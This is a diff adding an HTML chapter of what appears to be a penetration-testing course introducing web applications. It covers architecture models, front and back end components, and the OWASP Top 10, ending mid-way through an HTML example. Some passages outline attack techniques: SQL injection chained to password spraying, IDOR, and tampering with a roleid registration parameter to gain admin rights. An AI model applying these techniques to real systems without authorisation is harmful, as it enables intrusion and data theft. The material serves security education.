@@ -1,0 +1,1007 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+<h1 id="2-introduction-to-web-application">2. Introduction to Web Application</h1>
+<h2 id="introduction">Introduction</h2>
+<hr>
+<p><a href="https://en.wikipedia.org/wiki/Web_application">Web applications</a> are interactive applications that run on web browsers. Web applications usually adopt a <a href="https://cio-wiki.org/wiki/Client_Server_Architecture">client-server architecture</a> to run and handle interactions. They typically have front end components (i.e., the website interface, or "what the user sees") that run on the client-side (browser) and other back end components (web application source code) that run on the server-side (back end server/databases).</p>
+<p>This allows organizations to host powerful applications with near-complete real-time control over their design and functionality while being accessible worldwide. Some examples of typical web applications include online email services like <code>Gmail</code>, online retailers like <code>Amazon</code>, and online word processors like <code>Google Docs</code>.</p>
+<p><img src="storage\modules\75\htb-web-app_1.jpg" alt=""></p>
+<p>Web applications are not exclusive to giant providers like Google or Microsoft but can be developed by any web developer and hosted online in any of the common hosting services, to be used by anyone on the internet. This is why today we have millions of web applications all over the internet, with billions of users interacting with them every day.</p>
+<hr>
+<h3 id="web-applications-vs-websites">Web Applications vs. Websites</h3>
+<p>In the past, we interacted with websites that are static and cannot be changed in real-time. This means that traditional websites were statically created to represent specific information, and this information would not change with our interaction. To change the website's content, the corresponding page has to be edited by the developers manually. These types of static pages do not contain functions and, therefore, do not produce real-time changes. That type of website is also known as <a href="https://en.wikipedia.org/wiki/Web_2.0#Web_1.0">Web 1.0</a>.</p>
+<p><img src="storage\modules\75\website_vs_webapps.jpg" alt="web sites vs web apps"></p>
+<p>On the other hand, most websites run web applications, or <a href="https://en.wikipedia.org/wiki/Web_2.0">Web 2.0</a> presenting dynamic content based on user interaction. Another significant difference is that web applications are fully functional and can perform various functionalities for the end-user, while web sites lack this type of functionality. Other key differences between traditional websites and web applications include:</p>
+<ul>
+<li>Being modular</li>
+<li>Running on any display size</li>
+<li>Running on any platform without being optimized</li>
+</ul>
+<hr>
+<h3 id="web-applications-vs-native-operating-system-applications">Web Applications vs. Native Operating System Applications</h3>
+<p>Unlike native operating system (native OS) applications, web applications are platform-independent and can run in a browser on any operating system. These web applications do not have to be installed on a user's system because these web applications and their functionality are executed remotely on the remote server and hence do not consume any space on the end user's hard drive.</p>
+<p>Another advantage of web applications over native OS applications is version unity. All users accessing a web application use the same version and the same web application, which can be continuously updated and modified without pushing updates to each user. Web applications can be updated in a single location (webserver) without developing different builds for each platform, which dramatically reduces maintenance and support costs removing the need to communicate changes to all users individually.</p>
+<p>On the other hand, native OS applications have certain advantages over web applications, mainly their operation speed and the ability to utilize native operating system libraries and local hardware. As native applications are built to utilize native OS libraries, they are much faster to load and interact with. Furthermore, native applications are usually more capable than web applications, as they have a deeper integration to the operating system and are not limited to the browser's capabilities only.</p>
+<p>More recently, however, hybrid and progressive web applications are becoming more common. They utilize modern frameworks to run web applications using native OS capabilities and resources, making them faster than regular web applications and more capable.</p>
+<hr>
+<h3 id="web-application-distribution">Web Application Distribution</h3>
+<p>There are many open-source web applications used by organizations worldwide that can be customized to meet each organization's needs. Some common open source web applications include:</p>
+<ul>
+<li><a href="https://wordpress.com/">WordPress</a></li>
+<li><a href="https://www.opencart.com/">OpenCart</a></li>
+<li><a href="https://www.joomla.org/">Joomla</a></li>
+</ul>
+<p>There are also proprietary 'closed source' web applications, which are usually developed by a certain organization and then sold to another organization or used by organizations through a subscription plan model. Some common closed source web applications include:</p>
+<ul>
+<li><a href="https://www.wix.com/">Wix</a></li>
+<li><a href="https://www.shopify.com/">Shopify</a></li>
+<li><a href="https://www.dnnsoftware.com/">DotNetNuke</a></li>
+</ul>
+<hr>
+<h3 id="security-risks-of-web-applications">Security Risks of Web Applications</h3>
+<p>Web application attacks are prevalent and present a challenge for most organizations with a web presence, regardless of their size. After all, they are usually accessible from any country by everyone with an internet connection and a web browser and usually offer a vast attack surface. There are many automated tools for scanning and attacking web applications that, in the wrong hands, can cause significant damage. As web applications become more complicated and advanced, so does the possibility of critical vulnerabilities being incorporated into their design.</p>
+<p>A successful web application attack can lead to significant losses and massive business interruptions. Since web applications are run on servers that may host other sensitive information and are often also linked to databases containing sensitive user or corporate data, all of this data could be compromised if a web site is successfully attacked. This is why it is critical for any business that utilizes web applications to properly test these applications for vulnerabilities and patch them promptly while testing that the patch fixes the flaw and does not inadvertently introduce any new flaws.</p>
+<p>Web application penetration testing is an increasingly critical skill to learn. Any organization looking to secure their internet-facing (and internal) web applications should undergo frequent web application tests and implement secure coding practices at every development life cycle stage. To properly pentest web applications, we need to understand how they work, how they are developed, and what kind of risk lies at each layer and component of the application depending on the technologies in use.</p>
+<p>We will always come across various web applications that are designed and configured differently. One of the most current and widely used methods for testing web applications is the <a href="https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing">OWASP Web Security Testing Guide</a>.</p>
+<p>One of the most common procedures is to start by reviewing a web application's front end components, such as <code>HTML</code>, <code>CSS</code> and <code>JavaScript</code> (also known as the front end trinity), and attempt to find vulnerabilities such as <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Sensitive Data Exposure</a> and <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_\(XSS\">Cross-Site Scripting (XSS)</a>). Once all front end components are thoroughly tested, we would typically review the web application's core functionality and the interaction between the browser and the webserver to enumerate the technologies the webserver uses and look for exploitable flaws. We typically assess web applications from both an unauthenticated and authenticated perspective (if the application has login functionality) to maximize coverage and review every possible attack scenario.</p>
+<hr>
+<h3 id="attacking-web-applications">Attacking Web Applications</h3>
+<p>In this day and age most every company, no matter the size has one or more web applications within their external perimeter. These applications can be everything from simple static websites to blogs powered by Content Management Systems (CMS) such as <code>WordPress</code> to complicated applications with sign-up/login functionality supporting various user roles from basic users to super admins. Nowadays, it is not very common to find an externally facing host directly exploitable via a known public exploit (such as a vulnerable service or Windows remote code execution (RCE) vulnerability), though it does happen. Web applications provide a vast attack surface, and their dynamic nature means that they are constantly changing (and overlooked!). A relatively simple code change may introduce a catastrophic vulnerability or a series of vulnerabilities that can be chained together to gain access to sensitive data or remote code execution on the webserver or other hosts in the environment, such as database servers.</p>
+<p>It is not uncommon to find flaws that can lead directly to code execution, such as a file upload form that allows for the upload of malicious code or a file inclusion vulnerability that can be leveraged to obtain remote code execution. A well-known vulnerability that is still quite prevalent in various types of web applications is SQL injection. This type of vulnerability arises from the unsafe handling of user-supplied input. It can result in access to sensitive data, reading/writing files on the database server, and even remote code execution.</p>
+<p>We often find SQL injection vulnerabilities on web applications that use Active Directory for authentication. While we can usually not leverage this to extract passwords (since Active Directory administers them), we can often pull most or all Active Directory user email addresses, which are often the same as their usernames. This data can then be used to perform a <a href="https://us-cert.cisa.gov/ncas/current-activity/2019/08/08/acsc-releases-advisory-password-spraying-attacks">password spraying</a> attack against web portals that use Active Directory for authentication such as VPN or Microsoft Outlook Web Access/Microsoft O365. A successful password spray can often result in access to sensitive data such as email or even a foothold directly into the corporate network environment.</p>
+<p>This example shows the damage that can arise from a single web application vulnerability, especially when "chained" to extract data from one application that can be used to attack other portions of a company's external infrastructure. A well-rounded infosec professional should have a deep understanding of web applications and be as comfortable attacking web applications as performing network penetration testing and Active Directory attacks. A penetration tester with a strong foundation in web applications can often set themselves apart from their peers and find flaws that others may overlook. A few more real-world examples of web application attacks and the impact are as follows:</p>
+<table><thead><tr><th width="153">Flaw</th><th>Real-world Scenario</th></tr></thead><tbody><tr><td><a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL injection</a></td><td>Obtaining Active Directory usernames and performing a password spraying attack against a VPN or email portal.</td></tr><tr><td><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">File Inclusion</a></td><td>Reading source code to find a hidden page or directory which exposes additional functionality that can be used to gain remote code execution.</td></tr><tr><td><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">Unrestricted File Upload</a></td><td>A web application that allows a user to upload a profile picture that allows any file type to be uploaded (not just images). This can be leveraged to gain full control of the web application server by uploading malicious code.</td></tr><tr><td><a href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html">Insecure Direct Object Referencing (IDOR)</a></td><td>When combined with a flaw such as broken access control, this can often be used to access another user's files or functionality. An example would be editing your user profile browsing to a page such as /user/701/edit-profile. If we can change the <code>701</code> to <code>702</code>, we may edit another user's profile!</td></tr><tr><td><a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Broken Access Control</a></td><td>Another example is an application that allows a user to register a new account. If the account registration functionality is designed poorly, a user may perform privilege escalation when registering. Consider the <code>POST</code> request when registering a new user, which submits the data <code>username=bjones&amp;password=Welcome1&amp;email=bjones@inlanefreight.local&amp;roleid=3</code>. What if we can manipulate the <code>roleid</code> parameter and change it to <code>0</code> or <code>1</code>. We have seen real-world applications where this was the case, and it was possible to quickly register an admin user and access many unintended features of the web application.</td></tr></tbody></table>
+
+<p>Start becoming familiar with common web application attacks and their implications. Don't worry if any of these terms sound foreign at this point; they will become clearer as you progress and apply an iterative approach to learning.</p>
+<p>It is imperative to study web applications in-depth and become familiar with how they work and many different application stacks. We will see web application attacks repeatedly during our Academy journey, on the main HTB platform, and in real-life assessments. Let's dive in and learn the structure/function of web applications to become better-informed attackers, set us apart from our peers, and find flaws that others may overlook.</p>
+<h2 id="web-application-layout">Web Application Layout</h2>
+<hr>
+<p>No two web applications are identical. Businesses create web applications for a multitude of uses and audiences. Web applications are designed and programmed differently, and back end infrastructure can be set up in many different ways. It is important to understand the various ways web applications can run behind the scenes, the structure of a web application, its components, and how they can be set up within a company's infrastructure.</p>
+<p>Web application layouts consist of many different layers that can be summarized with the following three main categories:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Category</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Web Application Infrastructure</code></td>
+<td>Describes the structure of required components, such as the database, needed for the web application to function as intended. Since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access.</td>
+</tr>
+<tr>
+<td><code>Web Application Components</code></td>
+<td>The components that make up a web application represent all the components that the web application interacts with. These are divided into the following three areas: <code>UI/UX</code>, <code>Client</code>, and <code>Server</code> components.</td>
+</tr>
+<tr>
+<td><code>Web Application Architecture</code></td>
+<td>Architecture comprises all the relationships between the various web application components.</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="web-application-infrastructure">Web Application Infrastructure</h3>
+<p>Web applications can use many different infrastructure setups. These are also called <code>models</code>. The most common ones can be grouped into the following four types:</p>
+<ul>
+<li><code>Client-Server</code></li>
+<li><code>One Server</code></li>
+<li><code>Many Servers - One Database</code></li>
+<li><code>Many Servers - Many Databases</code></li>
+</ul>
+<hr>
+<p><strong>Client-Server</strong></p>
+<p>Web applications often adopt the <code>client-server</code> model. A server hosts the web application in a client-server model and distributes it to any clients trying to access it.</p>
+<p><img src="storage\modules\75\client-server-model.jpg" alt="client-server"></p>
+<p>In this model, web applications have two types of components, those in the front end, which are usually interpreted and executed on the client-side (browser), and components in the back end, usually compiled, interpreted, and executed by the hosting server.</p>
+<p>When a client visits the web application's URL (web address, i.e., <a href="https://www.acme.local">https://www.acme.local</a>), the server uses the main web application interface (<code>UI</code>). Once the user clicks on a button or requests a specific function, the browser sends an HTTP web request to the server, which interprets this request and performs the necessary task(s) to complete the request (i.e., logging the user in, adding an item to the shopping cart, browsing to another page, etc.). Once the server has the required data, it sends the result back to the client's browser, displaying the result in a human-readable way.</p>
+<p><code>This website we are currently interacting with is also a web application, developed and hosted by Hack The Box (webserver), and we access it and interact with it using our web browser (client).</code></p>
+<p>However, even though most web applications utilize a client-server front-back end architecture, there are many design implementations.</p>
+<hr>
+<p><strong>One Server</strong></p>
+<p>In this architecture, the entire web application or even several web applications and their components, including the database, are hosted on a single server. Though this design is straightforward and easy to implement, it is also the riskiest design.</p>
+<p><img src="storage\modules\75\one-server-arch.jpg" alt="one-server"></p>
+<p>If any web application hosted on this server is compromised in this architecture, then all web applications' data will be compromised. This design represents an "<code>all eggs in one basket</code>" approach since if any of the hosted web applications are vulnerable, the entire webserver becomes vulnerable.</p>
+<p>Furthermore, if the webserver goes down for any reason, all hosted web applications become entirely inaccessible until the issue is resolved.</p>
+<hr>
+<p><strong>Many Servers - One Database</strong></p>
+<p>This model separates the database onto its own database server and allows the web applications' hosting server to access the database server to store and retrieve data. It can be seen as many-servers to one-database and one-server to one-database, as long as the database is separated on its own database server.</p>
+<p><img src="storage\modules\75\many-server-one-db-arch.jpg" alt="many-server-one-db"></p>
+<p>This model can allow several web applications to access a single database to have access to the same data without syncing the data between them. The web applications can be replications of one main application (i.e., primary/backup), or they can be separate web applications that share common data.</p>
+<p>This model's main advantage (<code>from a security point of view</code>) is segmentation, where each of the main components of a web application is located and hosted separately. In case one webserver is compromised, other webservers are not directly affected. Similarly, if the database is compromised (i.e., through a SQL injection vulnerability), the web application itself is not directly affected. There are still access control measures that need to be implemented after asset segmentation, such as limiting web application access to only data needed to function as intended.</p>
+<hr>
+<p><strong>Many Servers - Many Databases</strong></p>
+<p>This model builds upon the <code>Many Servers, One Database</code> model. However, within the database server, each web application's data is hosted in a separate database. The web application can only access private data and only common data that is shared across web applications. It is also possible to host each web application's database on its separate database server.</p>
+<p><img src="storage\modules\75\many-server-many-db-arch.jpg" alt="many-server-many-db"></p>
+<p>This design is also widely used for redundancy purposes, so if any web server or database goes offline, a backup will run in its place to reduce downtime as much as possible. Although this may be more difficult to implement and may require tools like <a href="https://en.wikipedia.org/wiki/Load_balancing_\(computing\">load balancers</a>) to function appropriately, this architecture is one of the best choices in terms of security due to its proper access control measures and proper asset segmentation.</p>
+<p>Aside from these models, there are other web application models available such as <a href="https://aws.amazon.com/lambda/serverless-architectures-learn-more">serverless</a> web applications or web applications that utilize <a href="https://aws.amazon.com/microservices">microservices</a>.</p>
+<hr>
+<h3 id="web-application-components">Web Application Components</h3>
+<p>Each web application can have a different number of components. Nevertheless, all of the components of the models mentioned previously can be broken down to:</p>
+<ol>
+<li><code>Client</code></li>
+<li><code>Server</code><ul>
+<li>Webserver</li>
+<li>Web Application Logic</li>
+<li>Database</li>
+</ul>
+</li>
+<li><code>Services</code> (Microservices)<ul>
+<li>3rd Party Integrations</li>
+<li>Web Application Integrations</li>
+</ul>
+</li>
+<li><code>Functions</code> (Serverless)</li>
+</ol>
+<hr>
+<h3 id="web-application-architecture">Web Application Architecture</h3>
+<p>The components of a web application are divided into three different layers (AKA Three Tier Architecture).</p>
+<table data-header-hidden=""><thead><tr><th width="182"></th><th></th></tr></thead><tbody><tr><td><strong>Layer</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Presentation Layer</code></td><td>Consists of UI process components that enable communication with the application and the system. These can be accessed by the client via the web browser and are returned in the form of HTML, JavaScript, and CSS.</td></tr><tr><td><code>Application Layer</code></td><td>This layer ensures that all client requests (web requests) are correctly processed. Various criteria are checked, such as authorization, privileges, and data passed on to the client.</td></tr><tr><td><code>Data Layer</code></td><td>The data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed.</td></tr></tbody></table>
+
+<p>An example of a web application architecture could look something like this:</p>
+<p><img src="en-us\dotnet\architecture\modern-web-apps-azure\media\image5-12.png" alt="image"> Source: <a href="https://docs.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/common-web-application-architectures">Microsoft Docs</a></p>
+<p>Furthermore, some web servers can run operating system calls and programs, like <a href="https://learn.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525172\(v=vs.90\">IIS ISAPI</a>) or <a href="https://www.php.net/manual/en/install.unix.commandline.php">PHP-CGI</a>.</p>
+<hr>
+<p><strong>Microservices</strong></p>
+<p>We can think of microservices as independent components of the web application, which in most cases are programmed for one task only. For example, for an online store, we can decompose core tasks into the following components:</p>
+<ul>
+<li>Registration</li>
+<li>Search</li>
+<li>Payments</li>
+<li>Ratings</li>
+<li>Reviews</li>
+</ul>
+<p>These components communicate with the client and with each other. The communication between these microservices is <code>stateless</code>, which means that the request and response are independent. This is because the stored data is <code>stored separately</code> from the respective microservices. The use of microservices is considered <a href="https://en.wikipedia.org/wiki/Service-oriented_architecture">service-oriented architecture (SOA)</a>, built as a collection of different automated functions focused on a single business goal. Nevertheless, these microservices depend on each other.</p>
+<p>Another essential and efficient microservice component is that they can be written in different programming languages and still interact. Microservices benefit from easier scaling and faster development of applications, which encourages innovation and speeds upmarket delivery of new features. Some benefits of microservices include:</p>
+<ul>
+<li>Agility</li>
+<li>Flexible scaling</li>
+<li>Easy deployment</li>
+<li>Reusable code</li>
+<li>Resilience</li>
+</ul>
+<p>This AWS <a href="https://d1.awsstatic.com/whitepapers/microservices-on-aws.pdf">whitepaper</a> provides an excellent overview of microservice implementation.</p>
+<hr>
+<p><strong>Serverless</strong></p>
+<p>Cloud providers such as AWS, GCP, Azure, among others, offer serverless architectures. These platforms provide application frameworks to build such web applications without having to worry about the servers themselves. These web applications then run in stateless computing containers (Docker, for example). This type of architecture gives a company the flexibility to build and deploy applications and services without having to manage infrastructure; all server management is done by the cloud provider, which gets rid of the need to provision, scale, and maintain servers needed to run applications and databases.</p>
+<p>You can read more about serverless computing and its various use cases <a href="https://aws.amazon.com/serverless">here</a>.</p>
+<hr>
+<h3 id="architecture-security">Architecture Security</h3>
+<p>Understanding the general architecture of web applications and each web application's specific design is important when performing a penetration test on any web application. In many cases, an individual web application's vulnerability may not necessarily be caused by a programming error but by a design error in its architecture.</p>
+<p>For example, an individual web application may have all of its core functionality secure implemented. However, due to a lack of proper access control measures in its design, i.e., use of <a href="https://en.wikipedia.org/wiki/Role-based_access_control">Role-Based Access Control(RBAC)</a>, users may be able to access some admin features that are not intended to be directly accessible to them or even access other user's private information without having the privileges to do so. To fix this type of issue, a significant design change would need to be implemented, which would likely be both costly and time-consuming.</p>
+<p>Another example would be if we cannot find the database after exploiting a vulnerability and gaining control over the back-end server, which may mean that the database is hosted on a separate server. We may only find part of the database data, which may mean there are several databases in use. This is why security must be considered at each phase of web application development, and penetration tests must be carried throughout the web application development lifecycle.</p>
+<h2 id="front-end-vs-back-end">Front End vs. Back End</h2>
+<hr>
+<p>We may have heard the <a href="https://en.wikipedia.org/wiki/Front_end_and_back_end">terms</a> <code>front end</code> and <code>back end</code> web development, or the term <a href="https://www.w3schools.com/whatis/whatis_fullstack.asp">Full Stack</a> web development, which refers to both <code>front</code> and <code>back end</code> web development. These terms are becoming synonymous with web application development, as they comprise the majority of the web development cycle. However, these terms are very different from each other, as each refers to one side of the web application, and each function and communicate in different areas.</p>
+<hr>
+<h3 id="front-end">Front End</h3>
+<p>The front end of a web application contains the user's components directly through their web browser (client-side). These components make up the source code of the web page we view when visiting a web application and usually include <code>HTML</code>, <code>CSS</code>, and <code>JavaScript</code>, which is then interpreted in real-time by our browsers.</p>
+<p><img src="storage\modules\75\frontend-components.jpg" alt="front-end"></p>
+<p>This includes everything that the user sees and interacts with, like the page's main elements such as the title and text <a href="https://www.w3schools.com/html/html_intro.asp">HTML</a>, the design and animation of all elements <a href="https://www.w3schools.com/css/css_intro.asp">CSS</a>, and what function each part of a page performs <a href="https://www.w3schools.com/js/js_intro.asp">JavaScript</a>.</p>
+<p>In modern web applications, front end components should adapt to any screen size and work within any browser on any device. This contrasts with back end components, which are usually written for a specific platform or operating system. If the front end of a web application is not well optimized, it may make the entire web application slow and unresponsive. In this case, some users may think that the hosting server, or their internet, is slow, while the issue lies entirely on the client-side at the user's browser. This is why the front end of a web application must be optimized for most platforms, devices (including mobile!), and screen sizes.</p>
+<p>Aside from frontend code development, the following are some of the other tasks related to front end web application development:</p>
+<ul>
+<li>Visual Concept Web Design</li>
+<li>User Interface (UI) design</li>
+<li>User Experience (UX) design</li>
+</ul>
+<p>There are many sites available to us to practice front end coding. One example is <a href="https://html-css-js.com/">this one</a>. Here we can play around with the <a href="https://htmlg.com/html-editor/">editor</a>, typing and formatting text and seeing the resulting <code>HTML</code>, <code>CSS</code>, and <code>JavaScript</code> being generated for us. Copy/paste this VERY simple example into the right hand side of the editor:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;p&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>Welcome to Hack The Box Academy<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+&lt;p&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+&lt;p&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>This is some italic text.<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+&lt;p&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+&lt;p&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: #0000ff;"</span>&gt;</span>This is some blue text.<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+&lt;p&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+&lt;p&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+</code></pre>
+<p>Watch the simple HTML code render on the left. Play around with the formatting, headers, colors, etc., and watch the code change.</p>
+<hr>
+<h3 id="back-end">Back End</h3>
+<p>The back end of a web application drives all of the core web application functionalities, all of which is executed at the back end server, which processes everything required for the web application to run correctly. It is the part we may never see or directly interact with, but a website is just a collection of static web pages without a back end.</p>
+<p>There are four main back end components for web applications:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Component</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Back end Servers</code></td>
+<td>The hardware and operating system that hosts all other components and are usually run on operating systems like <code>Linux</code>, <code>Windows</code>, or using <code>Containers</code>.</td>
+</tr>
+<tr>
+<td><code>Web Servers</code></td>
+<td>Web servers handle HTTP requests and connections. Some examples are <code>Apache</code>, <code>NGINX</code>, and <code>IIS</code>.</td>
+</tr>
+<tr>
+<td><code>Databases</code></td>
+<td>Databases (<code>DBs</code>) store and retrieve the web application data. Some examples of relational databases are <code>MySQL</code>, <code>MSSQL</code>, <code>Oracle</code>, <code>PostgreSQL</code>, while examples of non-relational databases include <code>NoSQL</code> and <code>MongoDB</code>.</td>
+</tr>
+<tr>
+<td><code>Development Frameworks</code></td>
+<td>Development Frameworks are used to develop the core Web Application. Some well-known frameworks include <code>Laravel</code> (<code>PHP</code>), <code>ASP.NET</code> (<code>C#</code>), <code>Spring</code> (<code>Java</code>), <code>Django</code> (<code>Python</code>), and <code>Express</code> (<code>NodeJS JavaScript</code>).</td>
+</tr>
+</tbody>
+</table>
+<p><img src="storage\modules\75\backend-server.jpg" alt="backend-server"></p>
+<p>It is also possible to host each component of the back end on its own isolated server, or in isolated containers, by utilizing services such as <a href="https://www.docker.com/">Docker</a>. To maintain logical separation and mitigate the impact of vulnerabilities, different components of the web application, such as the database, can be installed in one Docker container, while the main web application is installed in another, thereby isolating each part from potential vulnerabilities that may affect the other container(s). It is also possible to separate each into its dedicated server, which can be more resource-intensive and time-consuming to maintain. Still, it depends on the business case and design/functionality of the web application in question.</p>
+<p>Some of the main jobs performed by back end components include:</p>
+<ul>
+<li>Develop the main logic and services of the back end of the web application</li>
+<li>Develop the main code and functionalities of the web application</li>
+<li>Develop and maintain the back end database</li>
+<li>Develop and implement libraries to be used by the web application</li>
+<li>Implement technical/business needs for the web application</li>
+<li>Implement the main <a href="https://en.wikipedia.org/wiki/API">APIs</a> for front end component communications</li>
+<li>Integrate remote servers and cloud services into the web application</li>
+</ul>
+<hr>
+<h3 id="securing-front-back-end">Securing Front/Back End</h3>
+<p>Even though in most cases, we will not have access to the back end code to analyze the individual functions and the structure of the code, it does not make the application invulnerable. It could still be exploited by various injection attacks, for example.</p>
+<p>Suppose we have a search function in a web application that mistakenly does not process our search queries correctly. In that case, we could use specific techniques to manipulate the queries in such a way that we gain unauthorized access to specific database data <a href="https://www.w3schools.com/sql/sql_injection.asp">SQL injections</a> or even execute operating system commands via the web application, also known as <a href="https://owasp.org/www-community/attacks/Command_Injection">Command Injections</a>.</p>
+<p>We will later discuss how to secure each component used on the front and back ends. When we have full access to the source code of front end components, we can perform a code review to find vulnerabilities, which is part of what is referred to as <a href="https://en.wikipedia.org/wiki/White-box_testing">Whitebox Pentesting</a>.</p>
+<p>On the other hand, back end components' source code is stored on the back end server, so we do not have access to it by default, which forces us only to perform what is known as <a href="https://en.wikipedia.org/wiki/Black-box_testing">Blackbox Pentesting</a>. However, as we will see, some web applications are open source, meaning we likely have access to their source code. Furthermore, some vulnerabilities such as <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">Local File Inclusion</a> could allow us to obtain the source code from the back end server. With this source code in hand, we can then perform a code review on back end components to further understand how the application works, potentially find sensitive data in the source code (such as passwords), and even find vulnerabilities that would be difficult or impossible to find without access to the source code.</p>
+<p>The <code>top 20</code> most common mistakes web developers make that are essential for us as penetration testers are:</p>
+<table data-header-hidden=""><thead><tr><th width="106"></th><th></th></tr></thead><tbody><tr><td><strong>No.</strong></td><td><strong>Mistake</strong></td></tr><tr><td><code>1.</code></td><td>Permitting Invalid Data to Enter the Database</td></tr><tr><td><code>2.</code></td><td>Focusing on the System as a Whole</td></tr><tr><td><code>3.</code></td><td>Establishing Personally Developed Security Methods</td></tr><tr><td><code>4.</code></td><td>Treating Security to be Your Last Step</td></tr><tr><td><code>5.</code></td><td>Developing Plain Text Password Storage</td></tr><tr><td><code>6.</code></td><td>Creating Weak Passwords</td></tr><tr><td><code>7.</code></td><td>Storing Unencrypted Data in the Database</td></tr><tr><td><code>8.</code></td><td>Depending Excessively on the Client Side</td></tr><tr><td><code>9.</code></td><td>Being Too Optimistic</td></tr><tr><td><code>10.</code></td><td>Permitting Variables via the URL Path Name</td></tr><tr><td><code>11.</code></td><td>Trusting third-party code</td></tr><tr><td><code>12.</code></td><td>Hard-coding backdoor accounts</td></tr><tr><td><code>13.</code></td><td>Unverified SQL injections</td></tr><tr><td><code>14.</code></td><td>Remote file inclusions</td></tr><tr><td><code>15.</code></td><td>Insecure data handling</td></tr><tr><td><code>16.</code></td><td>Failing to encrypt data properly</td></tr><tr><td><code>17.</code></td><td>Not using a secure cryptographic system</td></tr><tr><td><code>18.</code></td><td>Ignoring layer 8</td></tr><tr><td><code>19.</code></td><td>Review user actions</td></tr><tr><td><code>20.</code></td><td>Web Application Firewall misconfigurations</td></tr></tbody></table>
+
+<p>These mistakes lead to the <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> vulnerabilities for web applications, which we will discuss in other modules:</p>
+<table data-header-hidden=""><thead><tr><th width="96"></th><th></th></tr></thead><tbody><tr><td><strong>No.</strong></td><td><strong>Vulnerability</strong></td></tr><tr><td><code>1.</code></td><td>Broken Access Control</td></tr><tr><td><code>2.</code></td><td>Cryptographic Failures</td></tr><tr><td><code>3.</code></td><td>Injection</td></tr><tr><td><code>4.</code></td><td>Insecure Design</td></tr><tr><td><code>5.</code></td><td>Security Misconfiguration</td></tr><tr><td><code>6.</code></td><td>Vulnerable and Outdated Components</td></tr><tr><td><code>7.</code></td><td>Identification and Authentication Failures</td></tr><tr><td><code>8.</code></td><td>Software and Data Integrity Failures</td></tr><tr><td><code>9.</code></td><td>Security Logging and Monitoring Failures</td></tr><tr><td><code>10.</code></td><td>Server-Side Request Forgery (SSRF)</td></tr></tbody></table>
+
+<p>It is important to begin to familiarize ourselves with these flaws and vulnerabilities as they form the basis for many of the issues we cover in future web and even non-web related modules. As pentesters, we must have the ability to competently identify, exploit, and explain these vulnerabilities for our clients.</p>
+<h2 id="html">HTML</h2>
+<hr>
+<p>The first and most dominant component of the front end of web applications is <a href="https://en.wikipedia.org/wiki/HTML">HTML (HyperText Markup Language)</a>. HTML is at the very core of any web page we see on the internet. It contains each page's basic elements, including titles, forms, images, and many other elements. The web browser, in turn, interprets these elements and displays them to the end-user.</p>
+<p>The following is a very basic example of an HTML page:</p>
+<p><strong>Example</strong></p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Page Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>A Heading<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>A Paragraph<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
